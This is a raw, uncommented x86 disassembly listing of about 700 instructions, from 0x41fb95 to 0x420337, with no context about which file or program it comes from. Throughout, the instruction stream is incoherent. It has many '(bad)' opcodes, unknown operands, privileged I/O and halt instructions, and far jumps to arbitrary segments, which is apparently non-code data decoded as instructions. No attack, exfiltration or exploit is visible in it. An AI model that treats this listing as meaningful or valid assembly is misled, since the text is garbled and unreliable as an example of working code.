  41fb95:	sbb    eax,0xf23d7cd
  41fb9a:	arpl   WORD PTR [ecx],cx
  41fb9c:	inc    ebx
  41fb9d:	lahf   
  41fb9e:	push   es
  41fb9f:	mov    DWORD PTR [esp+ebx*2+0x23],eax
  41fba3:	pop    eax
  41fba4:	fsubr  QWORD PTR [ecx+0x441cae0a]
  41fbaa:	leave  
  41fbab:	fild   QWORD PTR [edx-0x26]
  41fbae:	cmp    edx,DWORD PTR [ecx-0x23]
  41fbb1:	in     eax,0x7c
  41fbb3:	inc    ecx
  41fbb4:	out    dx,al
  41fbb5:	clc    
  41fbb6:	mov    ebx,0xd64d3fa2
  41fbbb:	sbb    ch,BYTE PTR [edx-0x7e]
  41fbbe:	push   ss
  41fbbf:	dec    ebp
  41fbc0:	int    0x73
  41fbc2:	js     0x41fba9
  41fbc4:	mov    WORD PTR [ebp+0x61],?
  41fbc7:	or     bl,BYTE PTR [eax+0x58]
  41fbca:	dec    ebx
  41fbcb:	nop
  41fbcc:	inc    esi
  41fbcd:	lods   al,BYTE PTR ds:[esi]
  41fbce:	imul   esi,eax,0xd1ae75b4
  41fbd4:	sub    BYTE PTR [edi+0x50],al
  41fbd7:	jae    0x41fc4f
  41fbd9:	pop    ecx
  41fbda:	ja     0x41fb99
  41fbdc:	lea    edx,[ecx+0x64]
  41fbdf:	pop    ebp
  41fbe0:	rcr    DWORD PTR [ecx+0x63],cl
  41fbe3:	or     eax,0x46957a92
  41fbe8:	pop    ss
  41fbe9:	das    
  41fbea:	inc    ebx
  41fbeb:	mov    ebx,DWORD PTR [ecx+0x71]
  41fbee:	mov    ds:0x35457913,al
  41fbf3:	pop    es
  41fbf4:	dec    ebp
  41fbf5:	loopne 0x41fc1b
  41fbf7:	sbb    DWORD PTR [edx-0x39ac1dd6],ebx
  41fbfd:	sbb    esp,DWORD PTR [edx+edx*4+0x38c25978]
  41fc04:	cdq    
  41fc05:	es push ecx
  41fc07:	push   eax
  41fc08:	nop
  41fc09:	mov    dh,0xac
  41fc0b:	bound  esi,QWORD PTR [ebp*4+0x6bb7ee59]
  41fc12:	pusha  
  41fc13:	pop    eax
  41fc14:	jns    0x41fc60
  41fc16:	push   ebx
  41fc17:	outs   dx,DWORD PTR ds:[esi]
  41fc18:	repnz lds ebx,FWORD PTR [esi+eiz*1+0x45118591]
  41fc20:	out    0xaf,al
  41fc22:	std    
  41fc23:	sub    BYTE PTR [edi+0x2d],0xe2
  41fc27:	push   esi
  41fc28:	repz test eax,0xe5139fd
  41fc2e:	(bad)  
  41fc2f:	or     BYTE PTR [ebx+0x37b67ee2],al
  41fc35:	neg    esi
  41fc37:	hlt    
  41fc38:	cmp    eax,0x7dd53de7
  41fc3d:	sub    eax,0xef50cd8a
  41fc42:	scas   eax,DWORD PTR es:[edi]
  41fc43:	ja     0x41fc63
  41fc45:	adc    al,0xe1
  41fc47:	jp     0x41fc08
  41fc49:	xor    al,0x67
  41fc4b:	(bad)  
  41fc4c:	sar    DWORD PTR [edi-0x74],cl
  41fc4f:	sub    ecx,edx
  41fc51:	loope  0x41fc7c
  41fc53:	out    0xbd,eax
  41fc55:	dec    ebx
  41fc56:	stos   DWORD PTR es:[edi],eax
  41fc57:	(bad)  
  41fc58:	mov    eax,ds:0x1d40df50
  41fc5d:	sar    dl,1
  41fc5f:	dec    ebp
  41fc60:	sbb    esi,DWORD PTR [ecx-0x4e]
  41fc63:	mov    edi,0xdf9d09ee
  41fc68:	xor    BYTE PTR [edi+0x22],ch
  41fc6b:	sub    al,0x44
  41fc6d:	pop    ecx
  41fc6e:	xor    BYTE PTR [ecx-0x685b327],dl
  41fc74:	pop    edi
  41fc75:	or     DWORD PTR [edx+eiz*8+0xcf3fb45],ebp
  41fc7c:	or     DWORD PTR [ebp-0x400fb555],edx
  41fc82:	xchg   ecx,eax
  41fc83:	fxch   st(0)
  41fc85:	js     0x41fd06
  41fc87:	test   BYTE PTR [ebp-0xe550da1],ah
  41fc8d:	lods   al,BYTE PTR ds:[esi]
  41fc8e:	mov    ah,0x96
  41fc90:	div    bh
  41fc92:	loope  0x41fc56
  41fc94:	lods   eax,DWORD PTR ds:[esi]
  41fc95:	xor    DWORD PTR [eax],edx
  41fc97:	xchg   DWORD PTR [ecx],edx
  41fc99:	push   ebp
  41fc9a:	pusha  
  41fc9b:	aaa    
  41fc9c:	das    
  41fc9d:	add    DWORD PTR [edx+edx*4-0x71b422a0],edi
  41fca4:	dec    ebp
  41fca5:	push   ss
  41fca6:	ret    0x3a21
  41fca9:	mov    al,ds:0xcc057072
  41fcae:	jge    0x41fcb4
  41fcb0:	hlt    
  41fcb1:	rol    DWORD PTR [esi],cl
  41fcb3:	lods   eax,DWORD PTR ds:[esi]
  41fcb4:	mov    bl,0xb
  41fcb6:	lds    esi,FWORD PTR [esi-0x64945769]
  41fcbc:	xchg   esi,eax
  41fcbd:	addr16 xchg esi,eax
  41fcbf:	jb     0x41fce6
  41fcc1:	add    BYTE PTR [edi],al
  41fcc3:	ins    BYTE PTR es:[edi],dx
  41fcc4:	pop    ecx
  41fcc5:	vaddss xmm2,xmm5,xmm4
  41fcc9:	xchg   edi,eax
  41fcca:	jle    0x41fcff
  41fccc:	ds hlt 
  41fcce:	jae    0x41fcaf
  41fcd0:	and    edx,DWORD PTR [ecx-0x18]
  41fcd3:	xor    BYTE PTR [eax],al
  41fcd5:	xor    bh,BYTE PTR [edi-0x5a]
  41fcd8:	dec    edx
  41fcd9:	and    eax,0x60e3ffd0
  41fcde:	hlt    
  41fcdf:	pop    esp
  41fce0:	(bad)  
  41fce1:	sar    dh,cl
  41fce3:	rcr    DWORD PTR [ebx-0x42],1
  41fce6:	dec    edi
  41fce7:	pop    es
  41fce8:	outs   dx,DWORD PTR ds:[esi]
  41fce9:	sbb    BYTE PTR [ecx],bl
  41fceb:	cmp    al,ah
  41fced:	fist   DWORD PTR [ebp+0x8]
  41fcf0:	loopne 0x41fd00
  41fcf2:	push   esi
  41fcf3:	lds    eax,FWORD PTR [esi+0x744becd6]
  41fcf9:	jge    0x41fcce
  41fcfb:	fcom   DWORD PTR [esi-0x678547b]
  41fd01:	mov    DWORD PTR [eax-0x48],esp
  41fd04:	xchg   edi,eax
  41fd05:	call   0xadd7:0xe3d4096
  41fd0c:	mov    ebp,0x8c2c1e9d
  41fd11:	pop    esp
  41fd12:	add    DWORD PTR [edx],esi
  41fd14:	and    ecx,edi
  41fd16:	add    ebx,DWORD PTR [edx+ecx*8+0x4e]
  41fd1a:	or     al,0x17
  41fd1c:	fdiv   DWORD PTR [ecx]
  41fd1e:	shl    eax,cl
  41fd20:	addr16 jle 0x41fcf2
  41fd23:	(bad)  
  41fd24:	push   ebx
  41fd25:	inc    eax
  41fd26:	xor    eax,0xef9b092c
  41fd2b:	lock dec ecx
  41fd2d:	pop    esi
  41fd2e:	rcr    DWORD PTR [ebx+0x70b0e405],1
  41fd34:	inc    ebx
  41fd35:	stos   BYTE PTR es:[edi],al
  41fd36:	hlt    
  41fd37:	sbb    BYTE PTR [edi-0x3c9397e5],0xf2
  41fd3e:	inc    esi
  41fd3f:	or     DWORD PTR [edx+0x7873b7e8],ebp
  41fd45:	push   0x3a
  41fd47:	leave  
  41fd48:	xor    bl,BYTE PTR [edx]
  41fd4a:	fidivr WORD PTR [edi+0x20204ef3]
  41fd50:	jne    0x41fd68
  41fd52:	xchg   edi,eax
  41fd53:	xchg   ebx,eax
  41fd54:	sub    BYTE PTR [ecx],bh
  41fd56:	shl    bh,0x47
  41fd59:	test   al,0x2b
  41fd5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd5c:	push   esi
  41fd5d:	inc    esi
  41fd5e:	mov    WORD PTR [eax],?
  41fd60:	cli    
  41fd61:	xchg   ecx,eax
  41fd62:	jecxz  0x41fd6f
  41fd64:	add    dl,BYTE PTR [eax+0x5c]
  41fd67:	neg    ecx
  41fd69:	bound  ebp,QWORD PTR [esi-0x47]
  41fd6c:	push   DWORD PTR [ebp+0x368a6c0b]
  41fd72:	add    bl,cl
  41fd74:	call   0x1b93f3ed
  41fd79:	ret    0xf5ad
  41fd7c:	pop    esp
  41fd7d:	dec    ebx
  41fd7e:	jl     0x41fd94
  41fd80:	push   ebx
  41fd81:	int    0xa1
  41fd83:	or     bh,bh
  41fd85:	ret    0x869a
  41fd88:	mov    dl,0x94
  41fd8a:	jb     0x41fd84
  41fd8c:	xlat   BYTE PTR ds:[ebx]
  41fd8d:	aam    0x4a
  41fd8f:	add    BYTE PTR [ebx],bl
  41fd91:	mov    al,ds:0x52c9bab4
  41fd96:	(bad)  [esi+0x75e131e6]
  41fd9c:	push   eax
  41fd9d:	les    ecx,FWORD PTR [eax]
  41fd9f:	cwde   
  41fda0:	sub    al,0xb7
  41fda2:	mov    fs,WORD PTR [ecx+edx*4]
  41fda5:	ror    DWORD PTR [eax-0x4c8847c],1
  41fdab:	add    BYTE PTR [ebp+0x76],bh
  41fdae:	clc    
  41fdaf:	sar    BYTE PTR [edi-0x41807fbf],0x2f
  41fdb6:	imul   ebx,DWORD PTR [eax+0x44],0xe
  41fdba:	mov    ecx,0xac5d44ed
  41fdbf:	cdq    
  41fdc0:	dec    eax
  41fdc1:	dec    eax
  41fdc2:	mov    esi,0x28142b70
  41fdc7:	adc    ecx,DWORD PTR [ebx-0x23c5064b]
  41fdcd:	rol    DWORD PTR [ebx-0x618dc1bf],1
  41fdd3:	bound  edx,QWORD PTR [edi]
  41fdd5:	inc    edx
  41fdd6:	dec    esi
  41fdd7:	mov    al,ds:0x27463adc
  41fddc:	mov    al,es:0xd7b61345
  41fde2:	stc    
  41fde3:	or     BYTE PTR [edx],dl
  41fde5:	(bad)  
  41fde6:	jg     0x41fe56
  41fde8:	outs   dx,BYTE PTR ds:[esi]
  41fde9:	sub    eax,eax
  41fdeb:	test   BYTE PTR [eax+0x113e2b2a],ch
  41fdf1:	mov    ch,0xf6
  41fdf3:	scas   eax,DWORD PTR es:[edi]
  41fdf4:	in     eax,0x3e
  41fdf6:	and    al,0x11
  41fdf8:	mov    BYTE PTR [eax],bh
  41fdfa:	pop    ebp
  41fdfb:	push   ebp
  41fdfc:	mov    cl,0xf8
  41fdfe:	(bad)  
  41fe00:	mov    eax,0x8bc90b9b
  41fe05:	test   BYTE PTR [edx],ah
  41fe07:	into   
  41fe08:	sub    eax,DWORD PTR [edx]
  41fe0a:	or     BYTE PTR [edi-0x7717f9b0],al
  41fe10:	sahf   
  41fe11:	test   DWORD PTR [ecx],0x41d3116f
  41fe17:	add    DWORD PTR [esi-0x567136f4],0x5320e792
  41fe21:	jno    0x41fdb0
  41fe23:	mov    ecx,0xff3cc6de
  41fe28:	push   edx
  41fe29:	js     0x41fe5b
  41fe2b:	iret   
  41fe2c:	imul   esi,DWORD PTR [edi+0x393ace3d],0x78
  41fe33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe34:	xlat   BYTE PTR ds:[ebx]
  41fe35:	jmp    0xcde1:0x76ee7265
  41fe3c:	pop    ebx
  41fe3d:	sbb    ebx,DWORD PTR [ebp+0x232c7f7a]
  41fe43:	pop    ecx
  41fe44:	pushf  
  41fe45:	pusha  
  41fe46:	sbb    eax,0x20edbb41
  41fe4b:	test   al,0xd7
  41fe4d:	ss jmp 0x90d1:0x3e8575ad
  41fe55:	cwde   
  41fe56:	mov    dl,0x8f
  41fe58:	sbb    ebp,DWORD PTR [ecx+0x52]
  41fe5b:	aas    
  41fe5c:	cld    
  41fe5d:	imul   ebp,DWORD PTR [edx+edi*1-0x60],0x65
  41fe62:	aad    0x57
  41fe64:	clc    
  41fe65:	enter  0xd171,0xaf
  41fe69:	and    al,0x67
  41fe6b:	retf   0xc3f0
  41fe6e:	sbb    ebx,DWORD PTR [esi+edi*8+0x27]
  41fe72:	(bad)  
  41fe73:	aad    0x13
  41fe75:	sub    esp,DWORD PTR [esi-0x1e]
  41fe78:	xchg   esi,eax
  41fe79:	popf   
  41fe7a:	mov    dh,0x46
  41fe7c:	adc    al,0xd6
  41fe7e:	out    dx,al
  41fe7f:	sub    cl,BYTE PTR [edi+0x20e7f98a]
  41fe85:	and    ch,bl
  41fe87:	dec    edx
  41fe88:	arpl   WORD PTR [esi-0x29],cx
  41fe8b:	push   ss
  41fe8c:	xchg   esi,eax
  41fe8d:	push   eax
  41fe8e:	icebp  
  41fe8f:	imul   ebp,DWORD PTR [edx],0x485c162
  41fe95:	xchg   edi,eax
  41fe96:	and    BYTE PTR [esi+0x6d],dl
  41fe99:	lahf   
  41fe9a:	ror    DWORD PTR [eax+0x58caf7b8],cl
  41fea0:	jp     0x41fec4
  41fea2:	icebp  
  41fea3:	shr    cl,cl
  41fea5:	into   
  41fea6:	cld    
  41fea7:	ret    0x5310
  41feaa:	mov    WORD PTR [eax-0x63],es
  41fead:	pop    esi
  41feae:	into   
  41feaf:	(bad)  
  41feb0:	xchg   esi,ebx
  41feb2:	les    ebx,FWORD PTR [ecx-0x58]
  41feb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41feb6:	xchg   ecx,eax
  41feb7:	rcr    BYTE PTR [eax],0x6c
  41feba:	aas    
  41febb:	out    0x70,al
  41febd:	jo     0x41feef
  41febf:	jecxz  0x41fe81
  41fec1:	icebp  
  41fec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fec3:	stos   DWORD PTR es:[edi],eax
  41fec4:	gs out dx,eax
  41fec6:	jecxz  0x41fec1
  41fec8:	pushf  
  41fec9:	mov    ah,BYTE PTR [ecx+0x6cd8298d]
  41fecf:	arpl   WORD PTR [eax+ebp*8-0xd1c22f8],di
  41fed6:	int3   
  41fed7:	push   ebp
  41fed8:	jle    0x41ff2e
  41feda:	inc    esi
  41fedb:	adc    bh,BYTE PTR [edi+0x5e285d4]
  41fee1:	(bad)  
  41fee2:	int3   
  41fee3:	shl    ecx,cl
  41fee5:	xchg   esi,eax
  41fee6:	sub    bl,BYTE PTR [ebx+0x47029ccf]
  41feec:	div    DWORD PTR [esi+edx*1+0x625700a4]
  41fef3:	lods   al,BYTE PTR ds:[esi]
  41fef4:	pop    eax
  41fef5:	xor    ebx,eax
  41fef7:	cwde   
  41fef8:	sub    DWORD PTR [esp+eiz*4],eax
  41fefb:	stos   DWORD PTR es:[edi],eax
  41fefc:	adc    DWORD PTR [esi+0x353bbb35],eax
  41ff02:	adc    BYTE PTR [ecx+edi*2+0x35253743],dl
  41ff09:	pop    ss
  41ff0a:	sti    
  41ff0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff0c:	xor    al,0xf6
  41ff0e:	nop
  41ff0f:	sub    ebp,DWORD PTR [ebp+0x19]
  41ff12:	and    eax,0xa6cdb065
  41ff17:	and    esi,DWORD PTR [ebp+0x41]
  41ff1a:	xor    al,0x57
  41ff1c:	jecxz  0x41fec6
  41ff1e:	xor    dh,BYTE PTR [ecx+ebx*2]
  41ff21:	sbb    cl,BYTE PTR ds:0x4348aa6e
  41ff27:	xchg   ebp,eax
  41ff28:	add    esp,ebx
  41ff2a:	mov    bl,0x3d
  41ff2c:	mov    WORD PTR [eax+0x37405613],gs
  41ff32:	jecxz  0x41ff15
  41ff34:	xor    dh,ah
  41ff36:	shl    DWORD PTR [edi-0x277bb449],0x40
  41ff3d:	lds    edi,FWORD PTR [esi-0x61]
  41ff40:	or     BYTE PTR [esi+0x7e33aa51],ah
  41ff46:	mov    al,0xb2
  41ff48:	cli    
  41ff49:	(bad)  
  41ff4a:	and    al,0x32
  41ff4c:	xchg   ebx,eax
  41ff4d:	inc    eax
  41ff4e:	out    dx,eax
  41ff4f:	cmp    al,0x36
  41ff51:	aad    0x3f
  41ff53:	push   eax
  41ff54:	or     al,0x25
  41ff56:	dec    ebx
  41ff57:	sub    BYTE PTR [eax-0x4a],ah
  41ff5a:	mov    BYTE PTR [ebx+esi*4+0x5b],bh
  41ff5e:	test   bh,dh
  41ff60:	call   0x83a67192
  41ff65:	dec    ecx
  41ff66:	jne    0x41ffc8
  41ff68:	fwait
  41ff69:	pop    ss
  41ff6a:	jnp    0x41ffa6
  41ff6c:	jmp    0x1e33:0x4943a6b
  41ff73:	xchg   ebp,eax
  41ff74:	js     0x41fefa
  41ff76:	mov    ds:0x7248a1ca,eax
  41ff7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff7c:	pop    edi
  41ff7d:	out    dx,eax
  41ff7e:	xchg   ecx,eax
  41ff7f:	test   edi,edi
  41ff81:	fidivr DWORD PTR [esi]
  41ff83:	jl     0x41ff35
  41ff85:	in     al,dx
  41ff86:	mov    ds:0x18a0358a,eax
  41ff8b:	les    esp,FWORD PTR [edx+esi*4+0x7d51bd00]
  41ff92:	fnstsw WORD PTR [edx-0x47]
  41ff95:	mov    ebx,0x532b1ec0
  41ff9a:	ret    
  41ff9b:	leave  
  41ff9c:	ins    DWORD PTR es:[edi],dx
  41ff9d:	dec    ecx
  41ff9e:	mov    al,0x75
  41ffa0:	pop    edx
  41ffa1:	sbb    ebx,0x7d
  41ffa4:	mov    ebp,0xd2c06136
  41ffa9:	dec    ecx
  41ffaa:	in     al,dx
  41ffab:	and    DWORD PTR [edx-0x65fee4b3],ebp
  41ffb1:	inc    esp
  41ffb2:	cmp    DWORD PTR [eax+ebp*4-0x49149213],edx
  41ffb9:	push   ebp
  41ffba:	jmp    0x267d:0xd80b3cbe
  41ffc1:	popf   
  41ffc2:	xor    al,0x96
  41ffc4:	cli    
  41ffc5:	mov    BYTE PTR [esi+0x987af9d],dh
  41ffcb:	cld    
  41ffcc:	jne    0x41ff7a
  41ffce:	enter  0x63d8,0xb3
  41ffd2:	jbe    0x41ff90
  41ffd4:	push   0x49
  41ffd6:	rcl    DWORD PTR [edi-0x598487f3],1
  41ffdc:	mov    esi,0xb71d433e
  41ffe1:	idiv   DWORD PTR [ebx]
  41ffe3:	fmul   st,st(4)
  41ffe5:	add    ah,bh
  41ffe7:	cmp    BYTE PTR [esi],bh
  41ffe9:	call   0xed3e:0x34f15958
  41fff0:	fwait
  41fff1:	sbb    BYTE PTR [eax+0x123659a4],al
  41fff7:	push   ss
  41fff8:	adc    eax,0x7139d482
  41fffd:	loope  0x41ffec
  41ffff:	fld    QWORD PTR [ecx-0x22734d18]
  420005:	sbb    edi,DWORD PTR [eax-0x65d5daf4]
  42000b:	push   eax
  42000c:	or     DWORD PTR ss:[edx+0x7c8ad5ce],edx
  420013:	fstp   DWORD PTR [esi+0x62]
  420016:	pop    edx
  420017:	jecxz  0x420089
  420019:	ja     0x420080
  42001b:	fimul  DWORD PTR [ecx-0x73]
  42001e:	and    DWORD PTR [ebx],esi
  420020:	sar    BYTE PTR [ebx],cl
  420022:	ror    ebx,cl
  420024:	jno    0x41ffd1
  420026:	mov    edx,eax
  420028:	push   ss
  420029:	mov    bh,bl
  42002b:	rcr    esi,1
  42002d:	fild   DWORD PTR [edi+0x53]
  420030:	add    bh,dh
  420032:	lock and ch,BYTE PTR ds:0xf2cf7a3b
  420039:	cmp    DWORD PTR [ebx+eax*8],0x7936d79c
  420040:	lock mov cl,0xe1
  420043:	es pop ds
  420045:	mov    es,WORD PTR [edi+0x74]
  420048:	int    0xf9
  42004a:	bound  edx,QWORD PTR [ecx-0x4b]
  42004d:	lds    esp,FWORD PTR [ebx+0x16adf311]
  420053:	mov    edx,0x1dc46509
  420058:	lods   al,BYTE PTR ds:[esi]
  420059:	nop
  42005a:	int    0xd1
  42005c:	repnz pushf 
  42005e:	ja     0x4200dd
  420060:	jecxz  0x420050
  420062:	and    BYTE PTR [esi-0x7b208670],dl
  420068:	(bad)  
  420069:	dec    ebx
  42006a:	and    edi,DWORD PTR [ebx]
  42006c:	call   0xd056b3ac
  420071:	mov    esp,0x361a8f5e
  420076:	fimul  DWORD PTR [edi]
  420078:	cs cs push 0xffffffdf
  42007c:	imul   esp,ebx,0x4c9e15a6
  420082:	jle    0x420063
  420084:	dec    esi
  420085:	jmp    0xd73d:0xfa1b9935
  42008c:	loopne 0x4200b2
  42008e:	sbb    ebp,ebx
  420090:	repnz dec ecx
  420092:	cli    
  420093:	nop
  420094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420095:	sti    
  420096:	mov    ebp,ebx
  420098:	xor    DWORD PTR [edi+0x67],esi
  42009b:	mov    edi,0x98cd67ce
  4200a0:	cmp    DWORD PTR [edi+0x54a53f5e],0xa965cd3b
  4200aa:	adc    edi,esp
  4200ac:	push   eax
  4200ad:	xchg   ecx,eax
  4200ae:	int3   
  4200af:	xchg   DWORD PTR [esi-0x246b427],edx
  4200b5:	xor    esp,DWORD PTR [ebx-0x3d]
  4200b8:	pop    ecx
  4200b9:	jae    0x42007a
  4200bb:	and    DWORD PTR [eax],esp
  4200bd:	int    0x9c
  4200bf:	mov    ds:0xf062159,al
  4200c4:	adc    BYTE PTR [eax-0x64e99815],bh
  4200ca:	mov    BYTE PTR [esi],dh
  4200cc:	repnz and DWORD PTR [esi-0x1e],ecx
  4200d0:	sbb    eax,0x40f78ec2
  4200d5:	sub    eax,0xe7c6493e
  4200da:	test   eax,0x812874dc
  4200df:	mov    ebp,0x54880115
  4200e4:	pushf  
  4200e5:	dec    ebp
  4200e6:	test   al,0x4f
  4200e8:	sbb    eax,0x8a1d852b
  4200ed:	stos   DWORD PTR es:[edi],eax
  4200ee:	inc    edx
  4200ef:	jb     0x42009c
  4200f1:	adc    ebx,DWORD PTR [esi+0x13]
  4200f4:	push   0x67fec7af
  4200f9:	fdivp  st(6),st
  4200fb:	push   bx
  4200fd:	sub    al,0xfe
  4200ff:	inc    ecx
  420100:	jge    0x42010f
  420102:	dec    eax
  420103:	fimul  DWORD PTR [edx+edi*2-0x2e]
  420107:	pop    ebx
  420108:	int3   
  420109:	fisub  WORD PTR [edx-0x43]
  42010c:	push   ebp
  42010d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42010e:	and    eax,0x45db2a6c
  420113:	add    DWORD PTR [ecx],0xfffffff0
  420116:	stos   DWORD PTR es:[edi],eax
  420117:	arpl   cx,ax
  420119:	imul   edx,ebx,0xa9858956
  42011f:	push   cs
  420120:	mov    esi,0xc947e3b7
  420125:	jecxz  0x420107
  420127:	adc    al,0xb2
  420129:	jno    0x4200b5
  42012b:	mov    ebx,0x51bc1d7d
  420130:	ret    0xdb1d
  420133:	mov    bl,0xc8
  420135:	or     al,0xe0
  420137:	out    0x55,eax
  420139:	jmp    0x4200cb
  42013b:	popa   
  42013c:	mov    BYTE PTR [edx-0x15],cl
  42013f:	add    bl,BYTE PTR [edi+0x2b]
  420142:	imul   DWORD PTR [ecx]
  420144:	pop    ss
  420145:	mov    dl,0x45
  420147:	test   eax,0x54c8e6d6
  42014c:	xor    al,0xda
  42014e:	mov    esi,0x7c47f862
  420153:	int3   
  420154:	or     DWORD PTR [ecx-0x7213d344],edi
  42015a:	ficom  DWORD PTR ds:0xb0296f43
  420160:	mov    ah,0xdd
  420162:	aad    0xaf
  420164:	xchg   esp,eax
  420165:	(bad)  
  420167:	fwait
  420168:	xor    BYTE PTR [edx],bl
  42016a:	fucomi st,st(4)
  42016c:	mov    al,ds:0x7837a8bb
  420171:	lahf   
  420172:	push   DWORD PTR [ecx+0x59fe2c39]
  420178:	mov    dl,0xfc
  42017a:	out    dx,al
  42017b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42017c:	rcl    DWORD PTR [edi+0x74],cl
  42017f:	dec    DWORD PTR [esi+0x6bdc4027]
  420185:	ret    0x84fa
  420188:	jmp    0xb39a:0xb943dfe4
  42018f:	pushf  
  420190:	aas    
  420191:	mov    ecx,0x431706a6
  420196:	repz inc edx
  420198:	xor    eax,0xd43cf19a
  42019d:	pop    edi
  42019e:	fnsave [esi+0xf]
  4201a1:	shl    DWORD PTR [ecx+eax*2-0x788e1fd],cl
  4201a8:	jns    0x420219
  4201aa:	into   
  4201ab:	lahf   
  4201ac:	aaa    
  4201ad:	cwde   
  4201ae:	leave  
  4201af:	cwde   
  4201b0:	jmp    0x43690d42
  4201b5:	pushw  es
  4201b7:	and    bl,al
  4201b9:	pop    ds
  4201ba:	mov    ch,dh
  4201bc:	sub    BYTE PTR [edi],dl
  4201be:	out    0x51,eax
  4201c0:	ins    BYTE PTR es:[edi],dx
  4201c1:	fist   WORD PTR [ebp+0x5f]
  4201c4:	nop
  4201c5:	bound  ebp,QWORD PTR [edx]
  4201c7:	frstor [edx]
  4201c9:	mov    cl,0xf1
  4201cb:	out    dx,eax
  4201cc:	(bad)  
  4201cd:	mov    al,ds:0xff5a2981
  4201d2:	and    bl,ah
  4201d4:	cmp    DWORD PTR [edi-0x155c2571],esi
  4201da:	xchg   ebp,eax
  4201db:	retf   
  4201dc:	std    
  4201dd:	adc    eax,0x7db252c0
  4201e2:	jnp    0x4201d8
  4201e4:	neg    BYTE PTR [edx-0x3c]
  4201e7:	jmp    0x27f6:0x826b7e22
  4201ee:	addr16 mov edx,0xb2183b2a
  4201f4:	rcl    DWORD PTR [edi-0x52],0x7a
  4201f8:	loope  0x420185
  4201fa:	icebp  
  4201fb:	mov    es,ebp
  4201fd:	cmp    dl,BYTE PTR [edi]
  4201ff:	jae    0x42019e
  420201:	mov    ebp,0x23d64e4f
  420206:	sub    BYTE PTR [ebp+0x421d7e90],ah
  42020c:	mov    esp,0x18022684
  420211:	sbb    esi,DWORD PTR [esi-0x44b09f56]
  420217:	cmp    bh,BYTE PTR [edi+ecx*8-0x480cb8a8]
  42021e:	pop    eax
  42021f:	mov    ebx,0x6813f11f
  420224:	mov    esp,0x92f986a3
  420229:	mov    ch,0x4
  42022b:	fld    DWORD PTR [eax+edi*1]
  42022e:	ins    DWORD PTR es:[edi],dx
  42022f:	aas    
  420230:	xor    eax,0x6315b320
  420235:	mov    ch,0x63
  420237:	pop    esi
  420238:	push   esi
  420239:	daa    
  42023a:	jbe    0x4202ab
  42023c:	lahf   
  42023d:	fs sbb ch,dh
  420240:	push   0x7a7195e7
  420245:	retf   
  420246:	outs   dx,BYTE PTR ds:[esi]
  420247:	int    0x4
  420249:	and    DWORD PTR [esi],esp
  42024b:	and    eax,0x47956f3a
  420250:	fistp  WORD PTR [eax]
  420252:	jle    0x4201f8
  420254:	jnp    0x4202ae
  420256:	sub    eax,0xba8ebcb4
  42025b:	cmp    ebp,DWORD PTR [edx]
  42025d:	aam    0xe
  42025f:	aaa    
  420260:	(bad)  
  420261:	mov    al,ds:0x53e34e74
  420266:	mov    al,ds:0x64db097f
  42026b:	mov    ch,0x83
  42026d:	mov    bl,0xd0
  42026f:	jmp    0xceb4e22
  420274:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420275:	cmp    al,0xdf
  420277:	sbb    DWORD PTR [ebp-0x14],edx
  42027a:	daa    
  42027b:	jmp    0x9f2e04f1
  420280:	data16 lock xchg BYTE PTR [esi-0x6349ffaf],ch
  420288:	push   DWORD PTR [eax-0x72]
  42028b:	lods   eax,DWORD PTR ds:[esi]
  42028c:	adc    eax,0x24bf2d72
  420291:	xor    ebx,DWORD PTR [esi-0x5392b5fc]
  420297:	mov    bl,0xdd
  420299:	rcr    DWORD PTR [ecx-0x2052077e],0xf
  4202a0:	out    0x1a,al
  4202a2:	jns    0x4202b8
  4202a4:	and    eax,0x85b6997b
  4202a9:	mov    ch,0xc7
  4202ab:	dec    esi
  4202ac:	es (bad) 
  4202ae:	pop    esp
  4202af:	leave  
  4202b0:	call   0x9ff9:0x9eb54ed4
  4202b7:	repnz dec edi
  4202b9:	xlat   BYTE PTR ds:[ebx]
  4202ba:	pop    esi
  4202bb:	mov    al,0xc5
  4202bd:	pop    edi
  4202be:	test   BYTE PTR [ebx],cl
  4202c0:	push   ss
  4202c1:	pop    edi
  4202c2:	bound  ecx,QWORD PTR [ecx+0x649fec87]
  4202c8:	dec    ebp
  4202c9:	sbb    BYTE PTR [edx],al
  4202cb:	mov    dl,0x53
  4202cd:	int    0x4c
  4202cf:	out    dx,eax
  4202d0:	push   ebx
  4202d1:	xchg   ecx,eax
  4202d2:	push   ds
  4202d3:	lea    ebx,[esi]
  4202d5:	push   0x49f28c57
  4202da:	xor    ch,al
  4202dc:	in     al,dx
  4202dd:	popf   
  4202de:	cld    
  4202df:	lods   al,BYTE PTR ds:[esi]
  4202e0:	dec    ecx
  4202e1:	mov    WORD PTR [eax-0x33958fe9],cs
  4202e7:	or     edx,DWORD PTR [edi+0x1db6b39e]
  4202ed:	repz aas 
  4202ef:	rol    DWORD PTR [ebp-0x50819e5c],cl
  4202f5:	pop    eax
  4202f6:	ins    BYTE PTR es:[edi],dx
  4202f7:	ins    BYTE PTR es:[edi],dx
  4202f8:	ds mov esi,0x3858824d
  4202fe:	lods   eax,DWORD PTR ds:[esi]
  4202ff:	jle    0x4202e4
  420301:	popf   
  420302:	test   DWORD PTR es:[ebx],ebp
  420305:	and    DWORD PTR ds:0x62ff0b78,ebx
  42030b:	mov    eax,DWORD PTR [edx+0x2e]
  42030e:	dec    esi
  42030f:	inc    edx
  420310:	and    BYTE PTR [ecx+0x75b8f103],al
  420316:	lea    ebx,[edx+0x78]
  420319:	jae    0x42037d
  42031b:	xor    ebp,ebp
  42031d:	fadd   QWORD PTR [esi]
  42031f:	and    eax,0x79acde8
  420324:	jp     0x420364
  420326:	(bad)  
  420327:	lods   eax,DWORD PTR ds:[esi]
  420328:	mov    al,ds:0x23103029
  42032d:	or     al,0x42
  42032f:	outs   dx,DWORD PTR ds:[esi]
  420330:	xchg   edx,eax
  420331:	dec    edi
  420332:	out    dx,eax
  420333:	repz fcmovb st,st(1)
  420336:	xlat   BYTE PTR ds:[ebx]
  420337:	mov    edx,0x1e27c319
